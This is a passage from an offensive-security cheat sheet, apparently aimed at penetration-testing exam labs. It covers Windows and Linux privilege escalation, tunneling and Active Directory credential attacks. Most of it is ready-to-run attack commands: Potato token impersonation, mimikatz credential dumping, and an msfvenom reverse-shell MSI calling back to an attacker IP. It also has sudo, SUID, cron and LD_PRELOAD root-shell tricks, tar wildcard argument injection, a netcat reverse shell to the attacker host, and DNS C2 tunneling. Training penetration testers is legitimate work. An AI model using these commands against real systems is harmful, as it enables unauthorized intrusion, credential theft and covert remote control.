# Use Process Monitor (Procmon) filter:  Process Name = svc.exe, Result = NAME NOT FOUND, Path ends with .dll

9.3 Token Impersonation (Potatoes)

# Check for SeImpersonate / SeAssignPrimaryToken privileges
whoami /priv

# Common contexts that have SeImpersonate:
#   IIS app pools, MSSQL service, scheduled tasks running as service accounts

# Win10 1809+ / WS2019+:  PrintSpoofer, GodPotato
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Older Windows:  JuicyPotato, RoguePotato, RottenPotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# All Potatoes abuse the same primitive: coerce a SYSTEM-owned RPC client to
# authenticate to a local listener, capture the token, and impersonate it.

9.4 Stored Credentials

# PowerShell history (frequently contains passwords typed at the prompt)
Get-Content (Get-PSReadlineOption).HistorySavePath
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Saved RDP / SSH creds via Credential Manager
cmdkey /list
# Use mimikatz sekurlsa::credman / dpapi::cred to decrypt

# Unattend / sysprep XML left in c:\Windows\Panther
findstr /si password c:\windows\panther\unattend*.xml c:\windows\panther\unattended*.xml
findstr /si /m password *.xml *.ini *.txt *.config

# Group Policy Preferences cpassword (any user can read SYSVOL)
findstr /si "cpassword" \\<DC>\sysvol\*.xml
# Decrypt with gpp-decrypt (key is public, hardcoded by Microsoft)

# Browser-saved + Wi-Fi + IIS web.config
LaZagne.exe all
netsh wlan show profile name="<ssid>" key=clear

# In-memory creds (need SeDebug + admin)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

9.5 Scheduled Tasks

# List tasks running as a more privileged user
schtasks /query /fo LIST /v | findstr /i "TaskName Run\sAs Author"
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Select TaskName,Actions

# If a task runs a writable script — replace the script body
icacls "C:\Scripts\backup.ps1"
echo "C:\Temp\rev.exe" >> "C:\Scripts\backup.ps1"

# If a task points at a binary in a writable directory — drop a same-named exe
# (similar to service-binary hijacking)

9.6 AlwaysInstallElevated

# Both registry keys must be 1 for the bypass to work
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If yes — generate a malicious MSI that runs as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

9.7 Shadow Copies & SAM/SYSTEM Extraction

# Volume Shadow Copies often contain SAM/SYSTEM/NTDS.dit (DC) snapshots readable by a non-admin
vssadmin list shadows
mklink /D C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
copy C:\shadow\Windows\System32\config\SAM     C:\Temp\SAM
copy C:\shadow\Windows\System32\config\SYSTEM  C:\Temp\SYSTEM
copy C:\shadow\Windows\System32\config\SECURITY C:\Temp\SECURITY

# Dump local hashes offline with impacket
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Crack with hashcat -m 1000 hashes.txt rockyou.txt

# HiveNightmare / SeriousSAM (CVE-2021-36934) — SAM readable by Users on unpatched Win10/11
icacls C:\Windows\System32\config\SAM

9.8 Internal Services & Port Forwarding

# Identify localhost-only services on the box
netstat -ano | findstr LISTENING
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Forward to your Kali via SSH or chisel (see Tunneling section)
# Examples to look for: MSSQL on 1433, MySQL on 3306, internal HTTP admin panels on 8080

9.9 Kernel Exploits (last resort)

# Match the OS build to known LPE CVEs only after you've ruled out misconfig
wesng --systeminfo systeminfo.txt --impact "Elevation of Privilege"

# Reliable older ones for exam-style targets:
#   MS16-032 (secondary logon), MS16-135 (win32k), MS14-058 (Tracker)
#   CVE-2019-1388 (UAC certificate dialog elevation)
#   PrintNightmare (CVE-2021-1675 / 2021-34527) — server + client side
#   HiveNightmare (CVE-2021-36934)

# Compile or use pre-built binaries — verify SHA256 against trusted sources before running

10. Linux Privilege Escalation

Same triage as Windows: enumerate first, then prioritize misconfigs that don't depend on kernel CVEs — sudo NOPASSWD entries, SUID binaries, writable cron tasks, capabilities, PATH hijacking, group memberships (docker / disk / lxd). Kernel exploits are the last resort.

10.1 Enumeration

# Identity + kernel + environment
id; uname -a; cat /etc/os-release; cat /etc/issue
sudo -l                                       # most important command on the box
hostname; ip a; ss -tulnp; ps auxf
env; cat ~/.bash_history; cat ~/.viminfo

# Cron + timers
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all

# Filesystem hunt for high-value paths
find / -perm -4000 -type f 2>/dev/null                   # SUID
find / -perm -2000 -type f 2>/dev/null                   # SGID
find / -writable -type d 2>/dev/null | grep -v proc      # writable dirs
find / \( -name "id_rsa*" -o -name "*.kdbx" -o -name "*.pem" \) 2>/dev/null
grep -RIE 'password|passwd|api[_-]?key|secret' /etc /var/www /opt 2>/dev/null | head

# Automated
./linpeas.sh -a                               # most comprehensive
./lse.sh -l 2                                 # linux-smart-enumeration
./pspy64 -pf -i 1000                          # process snitching — watch crons fire in real time

10.2 SUID Binaries & sudo

# Always run sudo -l first; output dictates everything
sudo -l
# Look for: NOPASSWD entries, any binary GTFOBins lists, env_keep that preserves LD_PRELOAD/LD_LIBRARY_PATH

# GTFOBins is your reference — every SUID/sudo binary that can spawn a shell
# https://gtfobins.github.io

# High-frequency wins on labs (run with sudo or as SUID)
sudo -u root find . -exec /bin/sh \; -quit
sudo vim -c '!sh'
sudo less /etc/profile          # then :!sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo nmap --interactive         # legacy
sudo perl -e 'exec "/bin/sh";'

# env_keep abuse — LD_PRELOAD with NOPASSWD
echo 'void _init(){setuid(0);system("/bin/sh");}' > /tmp/x.c
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <allowed-binary>

# SUID binary that runs another tool by relative path -> PATH hijack
strings /usr/local/bin/buggy-suid | grep -E '^/'
echo -e '#!/bin/sh\nchmod +s /bin/bash' > /tmp/ls; chmod +x /tmp/ls
export PATH=/tmp:$PATH
/usr/local/bin/buggy-suid; /bin/bash -p

10.3 Cron Jobs & PATH Hijacking

# Inspect cron tables
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/

# Writable script run by root
ls -la /opt/backup.sh
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> /opt/backup.sh
# wait for cron, then:
/tmp/rb -p

# Relative-PATH cron: a root cron runs "tar ..." without a full path,
# and a writable directory appears earlier in root's PATH.
# Drop a malicious "tar" there.
echo -e '#!/bin/sh\ncp /bin/bash /tmp/rb && chmod +s /tmp/rb' > /writable/tar
chmod +x /writable/tar

# Wildcard expansion inside cron — see 10.6 below

10.4 File Capabilities

# List binaries with elevated capabilities
getcap -r / 2>/dev/null

# Common abusable
# cap_setuid+ep on python/perl/ruby/node    -> setuid(0); spawn shell
# cap_dac_read_search+ep on tar/cat/cp      -> read root-owned files (e.g. /root/.ssh/id_rsa)
# cap_sys_ptrace+ep                          -> attach to root processes
# cap_net_bind_service+ep                    -> bind privileged ports (usually low-value)

/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
/usr/bin/tar cf /tmp/k.tar /root/.ssh/id_rsa
tar xf /tmp/k.tar -C /tmp; cat /tmp/root/.ssh/id_rsa

10.5 MySQL UDF Privilege Escalation

# MySQL running as root + any user has FILE privilege -> load a UDF that runs commands
mysql -u root -e 'SELECT @@version_compile_os, @@version, current_user();'

# Compile UDF for the right MySQL version (raptor_udf2.c is the classic)
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# In MySQL
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');

10.6 Dangerous Group Memberships

id
# disk     — direct read of /dev/sda* -> recover /etc/shadow with debugfs
sudo debugfs /dev/sda1
debugfs: cat /etc/shadow

# docker   — root in container == root on host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd / lxc — same trick with a privileged container
lxc init alpine x -c security.privileged=true
lxc config device add x host disk source=/ path=/mnt/host
lxc start x; lxc exec x sh

# adm      — read /var/log (auth.log etc. may contain mistyped passwords)
# video / kvm / sudo — high-privilege groups; check sudoers anyway

10.7 Wildcard Exploitation

# When root runs something like:   tar czf backup.tgz *
# inside a directory you can write to — every file becomes a tar argument.
# Drop files whose names look like tar options:
cd /writable
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh; chmod +x shell.sh
# When root's cron runs tar in that dir, it executes shell.sh

# Same idea with chown -R, chmod -R, rsync, find -exec, etc.
# https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

10.8 Internal Services & Unmounted Filesystems

# Localhost-only services worth forwarding
ss -tulnp
# Common: 3306 (MySQL), 6379 (Redis), 11211 (memcached), 27017 (Mongo), 8080 (admin UIs)

# Forward via SSH to attack locally (see Tunneling section)
ssh -L 6379:127.0.0.1:6379 user@target

# Unmounted filesystems may contain credentials or backups
cat /etc/fstab
ls -la /mnt /media /srv
sudo mount <device> /mnt        # if sudo allows

10.9 Kernel Exploits (last resort)

# Match kernel version to known LPE CVEs only after misconfig paths exhausted
uname -a

# Reliable ones for exam-tier targets:
# CVE-2016-5195   DirtyCOW           (kernel < 4.8.3)
# CVE-2022-0847   Dirty Pipe         (5.8 <= kernel < 5.16.11/5.15.25/5.10.102)
# CVE-2021-4034   PwnKit (pkexec)    nearly every distro until Jan 2022 patch
# CVE-2021-3493   OverlayFS          Ubuntu 14.04/18.04/20.04
# CVE-2023-0386   OverlayFS again    kernel < 6.2
# CVE-2024-1086   nf_tables          Ubuntu 22/24

# Compile + run
gcc CVE-2021-4034.c -o pwnkit; ./pwnkit
gcc dirty-pipe.c -o dp; ./dp /etc/passwd

11. Port Redirection and Manual Tunneling

Forward traffic through a compromised DMZ host to reach otherwise-inaccessible internal targets. Choose the technique based on available binaries, OS, and firewall posture.

Mode Flag Who Opens the Port Traffic Direction Primary Use Case Example Command
Local -L Kali (attacker) Kali → SSH jump host → internal target Reach a single internal service (web app, DB, RDP) from Kali when you can SSH outbound to the pivot ssh -N -L 127.0.0.1:8080:10.10.10.20:80 user@pivot
Remote -R Kali SSH server (listener opened there) Kali ← pivot host → internal target Pivot can call out to Kali but inbound firewall blocks direct SSH from Kali to pivot ssh -N -R 127.0.0.1:4444:10.10.10.20:445 user@kali
Dynamic (local) -D Kali (SOCKS listener) Kali (proxychains) → SOCKS port → pivot → any internal host:port Full subnet sweep or multi-target attack from Kali through pivot ssh -N -D 127.0.0.1:1080 user@pivot
Dynamic (remote) -R [port] (no destination) Kali SSH server (SOCKS listener) Kali (proxychains) → SOCKS on Kali → pivot → any internal host:port Same as dynamic local but pivot must initiate the SSH connection outbound; requires OpenSSH 7.6+ ssh -N -R 1080 user@kali (run from pivot)
Tool / Method OS Scenario / When to Use Single Port or Multi-Target Requires Extra Binary OPSEC Notes
socat relay Linux Quick single-service relay on a DMZ host; no SSH credentials needed Single port per process Yes — upload socat if not present Unencrypted; process appears in ps aux and ss -ntlp
ssh -L local forward Linux / macOS / Win 10+ Reach one internal service from Kali when outbound SSH to pivot is allowed Single port per -L flag (can stack multiple) No (uses existing SSH client) Encrypted; SSH session visible in w / who / auth logs on pivot
ssh -R remote forward Linux / macOS / Win 10+ Pivot calls out to Kali; inbound firewall prevents direct Kali→pivot connections Single port per -R flag No Encrypted; outbound SSH from pivot may be logged; binds loopback by default
ssh -D dynamic (SOCKS) Linux / macOS / Win 10+ Full subnet enumeration or attacking multiple services through one tunnel Multi-target (all TCP) No Encrypted; high volume of connections through SOCKS may trigger IDS alerts
ssh -R [port] remote SOCKS Linux / macOS / Win 10+ (OpenSSH 7.6+) Multi-target via SOCKS when pivot must initiate the SSH session outbound Multi-target (all TCP) No Same as remote forward; verify OpenSSH version before relying on it
Plink -R Windows (any version) Older Windows host without built-in SSH client; single-port reverse tunnel to Kali Single port only (no SOCKS support) Yes — upload plink.exe AV may flag plink.exe; binary drop visible on disk and in process list
Netsh portproxy Windows (any version) No tools can be uploaded; SYSTEM/Admin privileges available; TCP relay only Single port per rule No (built-in kernel feature) Rules survive reboot; visible via netsh interface portproxy show all; must clean up

11.1 Port Redirection with Socat

Run on a compromised DMZ host to relay a local port to an internal target; use nohup ... & to keep it alive.

socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]

11.2 SSH Local Port Forwarding

Bind a port on Kali and tunnel traffic to an internal target via the SSH jump host. Stack multiple -L flags for several services in one session.

ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host

11.3 SSH Dynamic Port Forwarding

Opens a local SOCKS4/5 proxy; route any tool through it with proxychains. Use -sT -Pn -n with nmap — SOCKS cannot carry ICMP or UDP.

ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]
proxychains smbclient -L //[internal_ip]/ -U [username] --password=[password]

11.4 SSH Remote Port Forwarding

The pivot calls out to Kali's SSH daemon, which binds a port; connections to that port are relayed back to the internal target. Requires sudo systemctl start ssh on Kali.

ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host

11.5 SSH Remote Dynamic Port Forwarding

Opens a SOCKS listener on Kali rather than a single forwarded port; gives Kali full access to the internal subnet. Requires OpenSSH 7.6+ on the pivot (ssh -V to check).

ssh -N -R [proxychains_port] username@remote_host
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]

11.6 SSH (Windows)

Windows 10 1803+ / Server 2019+ ships OpenSSH at C:\Windows\System32\OpenSSH\ssh.exe; same flags as Linux. Use -o StrictHostKeyChecking=no to skip the host-key prompt in non-interactive shells.

where ssh
ssh.exe -V

# Remote dynamic port forward from Windows to Kali
ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
# /etc/proxychains4.conf on Kali
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]

ss -ntplu

11.7 Plink (Windows)

Single-executable SSH client for legacy Windows; mirrors OpenSSH -R semantics but does not support SOCKS dynamic forwarding. Pipe echo y to suppress the interactive host-key prompt.

# Serve nc.exe and plink.exe from Kali
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
find / -name plink.exe 2>/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
# Download to Windows target
wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe

# Reverse shell
C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]

# SSH remote port forward via Plink (auto-accept host key)
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
# Connect to the forwarded port from Kali
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]

11.8 Netsh (Windows)

Built-in Windows kernel TCP relay via the IP Helper service; no binary upload needed. Requires SYSTEM or Administrator. Rules persist across reboots — clean up after the engagement.

# Add port forwarding rule
netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]

# Verify
netstat -anp TCP | find "[LISTEN_PORT]"
netsh interface portproxy show all

# Allow through Windows firewall
netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
# Connect through forwarded port from Kali
ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
# Cleanup
netsh advfirewall firewall delete rule name="[RULE_NAME]"
netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]

12. Tunneling Through Tools

Ligolo-ng uses a kernel TUN interface for transparent Layer-3 routing; Chisel wraps tunnels inside HTTP for firewall evasion; Dnscat2 encodes C2 traffic inside DNS queries as a last-resort covert channel.

Tool Transport / Protocol Setup Complexity Best Use Case Detectability
Ligolo-ng TLS over TCP (default port 11601); kernel TUN interface for Layer-3 routing Medium — requires sudo ip tuntap and ip route add on Kali; agent binary needed on pivot Full subnet access when you have code execution on a dual-homed host; ideal for Nmap sweeps, Impacket, and browser traffic to internal networks Medium — raw TLS on a non-standard port; unusual process with TUN interface creation; binary on disk is artifact
Chisel TCP/UDP wrapped in HTTP or HTTP/2 (yamux multiplexer); configurable port (commonly 80 or 443) Low — single binary each side; SOCKS5 proxy or port-forward with one command per host Outbound HTTP/HTTPS is the only permitted egress; quick SOCKS5 proxy for proxychains without kernel-level changes Medium-High — HTTP-encapsulated tunnel is obvious in proxy/web logs; high request volume; running on 443 with realistic path reduces suspicion slightly
Dnscat2 DNS queries/responses (TXT, CNAME, MX record types) over UDP/TCP port 53; requires attacker-controlled authoritative DNS High — need a registered domain, NS record pointing to Kali, and Ruby gem dependencies; client compiled or pre-built on victim Last-resort covert channel when all TCP/UDP outbound is blocked but recursive DNS resolution is permitted (strict corporate egress or cloud VPC) Very High — high-volume anomalous DNS queries to a single domain; long query names; easily flagged by NDR/EDR; very slow (kilobits/second)

12.1 Ligolo (Direct Subnetting)

Ligolo-ng creates a virtual TUN interface on the attacker machine and routes traffic directly into internal subnets through a lightweight agent on the pivot host.

  • A Go binary (agent) on the victim opens a TLS-encrypted connection back to the proxy on Kali; the proxy binds a kernel TUN interface so all traffic sent to the internal subnet routes through that connection transparently.
  • Download the correct agent architecture (linux/amd64, linux/arm64, windows/amd64) for the pivot host OS.
  • Transfer the agent to a temp directory (C:\Windows\Temp, /tmp) and delete after use.

12.1.1 Normal Tunneling

Single-hop pivot: bring up the TUN interface, start the proxy, deploy the agent, add a route, then start the session.

# Step 1 — Create and bring up the TUN interface (Kali)
sudo ip tuntap add user [kali_user] mode tun ligolo
sudo ip link set ligolo up
# Step 2 — Start the proxy server (Kali)
./ligolo_proxy_linux -selfcert
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
# Step 3 — Add the route to the internal subnet (second Kali terminal)
sudo ip route add [internal_submask]/24 dev ligolo
ip route list
# Step 4 — Start the session (ligolo proxy terminal)
» session
» start
# Transfer the agent to the victim (Windows)
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe

# Connect the agent back to the proxy
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert

12.1.2 Double Tunneling

When the first pivot host has two interfaces, chain a second pivot to reach a deeper network segment via a listener_add relay on the first session.

# Step 1 — Create a second TUN interface (Kali)
sudo ip tuntap add user [kali_user] mode tun ligolo_double
sudo ip link set ligolo_double up
# Step 2 — Add a listener on the active session to relay agent connections
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list
# Step 3 — Connect the second agent through the first pivot
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
# Step 4 — Switch to the second session, start the tunnel, add the route
# In ligolo proxy: select the second pivot session, then run start
sudo ip add route <New_Network> dev ligolo_double

12.1.3 Local Port Forwarding

Ligolo-ng reserves the 240.0.0.0/8 range internally; routing 240.0.0.1/32 over the TUN interface makes the victim's 127.0.0.1 reachable from Kali, exposing services bound only to loopback (MySQL/3306, PostgreSQL/5432, Redis/6379, etc.).

# Add the special hardcoded route — traffic to 240.0.0.1 goes to the victim's loopback
sudo ip route add 240.0.0.1/32 dev ligolo

# Scan the victim's local services via the magic address
nmap 240.0.0.1 -sV

12.1.4 Reverse Shells From Internal Networks

Add a Ligolo listener to relay a reverse shell from an internal host back to a Netcat listener on Kali.

# Step 1 — Start the Netcat listener (Kali)
nc -nvlp [kali_port]
# Step 2 — Add a listener in the Ligolo session
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
# Step 3 — Trigger the reverse shell on the internal host (must target pivot IP, not Kali)
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
./payload.exe

12.1.5 File Transfers From Internal Networks

Add a Ligolo listener to relay HTTP file-transfer requests from the internal host back to a Python HTTP server on Kali.

# Step 1 — Add a listener in the Ligolo session
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
# Step 2 — Serve files from Kali
python3 -m http.server [kali_port]
# Step 3 — Download the file on the internal Windows host (use pivot IP, not Kali IP)
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]

12.2 Chisel (HTTP Tunneling)

Chisel wraps TCP/UDP tunnels over HTTP using the yamux multiplexer; supports forward and reverse modes with optional shared-secret authentication.

  • Use forward mode when the victim can reach Kali; use --reverse mode when the victim is behind NAT.
  • Server and client must be the same version; confirm with chisel --version on both ends.
  • In /etc/proxychains.conf the SOCKS port must match exactly what the client announces; use dynamic_chain and increase timeouts for slow links.
Chisel Mode Command Pattern When to Use proxychains Required?
Forward port forward Server: chisel server -p <port>
Client: chisel client <server>:<port> <local>:<dst>:<dport>		 Expose a single remote service on a local port; victim can reach Kali No — direct localhost:<local> access
Reverse port forward Server: chisel server -p <port> --reverse
Client: chisel client <server>:<port> R:<local>:<dst>:<dport>		 Victim behind NAT; expose single remote service back to Kali No — direct localhost:<local> access
Forward SOCKS5 proxy Server: chisel server -p <port> --socks5
Client: chisel client <server>:<port> <local>:socks		 Full subnet access when victim can reach Kali; Kali acts as SOCKS server Yes — configure socks5 127.0.0.1 <local>
Reverse SOCKS5 proxy Server: chisel server -p <port> --reverse
Client: chisel client <server>:<port> R:<remote>:socks		 Full subnet access when victim is behind NAT; victim dials out to Kali Yes — configure socks5 127.0.0.1 <remote> 
# Port Forwarding
chisel server -p <listen-port>                                                         # remote
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>       # local
# Reverse Port Forwarding
chisel server -p <LOCAL_PORT> --reverse                                                           # local
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>         # remote
curl http://localhost:<LOCAL_FORWARD_PORT>
# Forward Dynamic SOCKS Proxy
chisel server -p <REMOTE_PORT> --socks5        # remote
chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks   # local

# /etc/proxychains.conf — comment out socks4, add:
socks5 127.0.0.1 <LOCAL_PORT>
# Reverse Dynamic SOCKS Proxy
chisel server -p <LOCAL_PORT> --reverse                              # local
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks         # remote

# /etc/proxychains.conf — add:
socks5 127.0.0.1 <REMOTE_PORT>

proxychains nmap localhost

12.3 Dnscat2 (DNS Tunneling)

Dnscat2 tunnels C2 traffic over DNS queries; use when only port 53 egress is permitted. Requires a registered domain with an NS record pointing to Kali, or direct UDP/53 access in lab environments.

  • The client encodes data inside DNS query names (TXT, CNAME, MX lookups) destined for an attacker-controlled domain; the authoritative server on Kali decodes and responds, creating a bidirectional channel.
  • Practical throughput is 1–10 KB/s; interactive shells work but are sluggish; avoid file transfers larger than a few kilobytes.
  • Always pass --secret to authenticate the channel; without it any host resolving your domain can inject commands.
  • Use --dns server=[attacker_ip],port=53 on the client for direct mode (no domain/NS record needed; requires direct UDP/53 to Kali).
Dnscat2 Step Command Notes
Start server (Kali) dnscat2-server [domain] Requires authoritative NS record for [domain] pointing to Kali; listens on UDP/53
Start client via domain ./dnscat --secret=[secret] [domain] Uses recursive DNS; works through corporate resolvers as long as external DNS is permitted
Start client direct ./dnscat --dns server=[attacker_ip],port=53 --secret=[secret] No domain/NS record needed; victim must have direct UDP/53 access to Kali
List sessions dnscat2> windows Each connected client appears as a numbered window; confirm session is live before pivoting
Attach to session dnscat2> window -i [session_id] Opens interactive shell or command channel with the selected client
Port forward through tunnel command ([session]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port] Binds local_port on Kali; traffic tunneled via DNS to target; expect high latency
Access forwarded service smbclient -p [local_port] -L //127.0.0.1 -U [user] --password=[pass] Replace with appropriate client tool; increase timeout flags to compensate for DNS latency 
# Step 1 — Start the server (Kali)
dnscat2-server [domain]
# Step 2 — Start the client (victim)
./dnscat --secret=[secret] [domain]
./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]
# Step 3 — Interact with a connected client
dnscat2> windows
dnscat2> window -i [session_id]
# Step 4 — Port forward over the DNS tunnel
command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]

# Step 5 — Connect to the forwarded service
smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]

13. Active Directory Theory

Active Directory manages users, computers, and resources in a domain; a single compromised account can cascade to full domain takeover.

  • Domains in a forest share transitive trusts; a child-domain foothold can reach the forest root via SID-history attacks.
  • Every domain-joined host exposes LDAP, Kerberos, SMB, RPC, DNS, and WinRM — all accepting domain credentials.
  • Enumerate with BloodHound/SharpHound, ldapdomaindump, or PowerView before attempting any credential attack.
  • Legacy protocols (NTLM, RC4 Kerberos) often remain enabled for compatibility even in hardened environments.

13.1 Overview

  • AD organises objects into Organisational Units (OUs) controlled by Domain Controllers (DCs), which store all domain password hashes.
  • Full control requires targeting the Domain Admins group or a DC directly.
  • Services integrate with AD via Service Principal Names (SPNs); Kerberos issues tickets — possession of a ticket allows impersonation.
  • NTDS.dit — AD database on every DC; offline extraction exposes every domain account hash.
  • Misconfigured GPOs can grant low-privileged users write access, enabling code execution on all machines in the OU.
  • High-value groups: Domain Admins, Enterprise Admins, Schema Admins, Backup Operators (read NTDS.dit), Account Operators (modify group membership), DNSAdmins (load DLL into DNS service running as SYSTEM).
  • Global Catalog (TCP 3268/3269) — partial replica of all forest objects; useful for cross-domain enumeration.
  • ACL edges (GenericAll, WriteDACL, ForceChangePassword, AddMember) are frequently the overlooked path to privilege escalation; BloodHound surfaces these as graph edges.

13.2 Authentication

  • NTLM — Challenge/response; DC verifies the response; no mutual auth; no salt (same password = same hash).
  • Kerberos — KDC issues a TGT (valid ~10 h) then TGS tickets per service; both client and service are mutually authenticated.
  • NTLM is used when the target is addressed by IP, the service has no SPN, or the client is not domain-joined.
  • Accounts with Kerberos pre-authentication disabled are vulnerable to AS-REP Roasting.
  • NTLMv1 can be cracked near-instantly via pre-computed tables at crack.sh.
  • Check LDAP signing before planning a relay: crackmapexec ldap <dc> -u <user> -p <pass> -M ldap-checker.
Property NTLM Kerberos
Authentication model Challenge / response (3-way handshake) Ticket-based (TGT → TGS → Service)
Third-party involvement DC verifies the final response (NTLMv2); point-to-point possible for local accounts KDC (AS + TGS) is always involved for ticket issuance
Password transmitted? Never; only the NT hash is used to sign the challenge response Never; the NT hash encrypts the AS-REQ timestamp (pre-auth)
Encryption / algorithm MD4 (NT hash); HMAC-MD5 for NTLMv2 response RC4-HMAC (legacy) or AES-128 / AES-256 (modern)
Mutual authentication No — server is not authenticated to the client Yes — both client and service are authenticated via the KDC
Salting No — same password always produces the same NT hash (enables PtH) Yes — Kerberos keys are derived with the account name as salt
Credential relaying Easily relayed; Responder + ntlmrelayx capture and replay NTLM hashes Harder to relay; requires specific conditions (KrbRelayUp, RBCD)
When protocol is used Target addressed by IP; workgroup host; service does not register an SPN; explicit NTLM fallback Target addressed by hostname in a domain; SPN registered; domain-joined client
Primary offline attack Capture NTLMv2 hash → crack with hashcat -m 5600; or PtH without cracking AS-REP Roasting (-m 18200); Kerberoasting (-m 13100)
Primary ticket/hash attack Pass-the-Hash; NTLM relay to SMB/LDAP/HTTP Pass-the-Ticket; Overpass-the-Hash; Silver/Golden Ticket forgery
Logging / detection Event ID 4776 (credential validation on DC); easier to miss in high-volume environments Event IDs 4768 (AS-REQ), 4769 (TGS-REQ), 4771 (pre-auth failure) — richer audit trail
OPSEC consideration Relay attempts are network-visible; avoid triggering MDI/Defender NTLMv1 alerts Requesting RC4 tickets in an AES-only environment is anomalous — prefer AES when possible

13.3 Credential Storage & Hash Dumping

LSASS caches credentials in memory; with admin access those caches yield hashes, tickets, and sometimes cleartext credentials.

  • Windows stores passwords as unsalted MD4 (NT) hashes — same password always gives the same hash, enabling Pass-the-Hash.
  • Local accounts: C:\Windows\System32\config\SAM. Domain accounts: C:\Windows\NTDS\NTDS.dit on DCs.
  • LSASS dump methods: Mimikatz sekurlsa::logonpasswords, Task Manager memory dump, procdump.exe -ma lsass.exe — all require SYSTEM or SeDebugPrivilege.
  • LSASS stores TGTs and TGSs; Mimikatz can extract them for Kerberoasting or ticket forgery.
